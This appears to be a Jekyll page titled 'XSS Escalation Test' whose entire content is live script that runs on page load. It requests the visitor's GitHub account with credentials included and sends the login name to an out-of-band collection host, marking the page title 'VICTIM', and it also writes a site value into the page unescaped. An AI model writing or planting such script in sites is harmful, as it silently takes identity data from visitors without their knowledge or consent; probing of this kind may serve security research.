---
layout: null
---
# XSS Escalation Test
<script>
fetch("https://api.github.com/user", {credentials: "include"})
  .then(r => r.json())
  .then(d => {
    if(d.login) {
      document.title = "VICTIM:" + d.login;
      new Image().src = "http://d9639s25j6jvk74dn89gbdyw6p3kkmcet.oast.online/gh-data?login=" + d.login;
    } else {
      document.title = "NO_DATA";
    }
  })
  .catch(e => {
    document.title = "ERR:" + e.message;
  });
</script>
<script>document.write("DESC:" + "{{ site.description }}")</script>
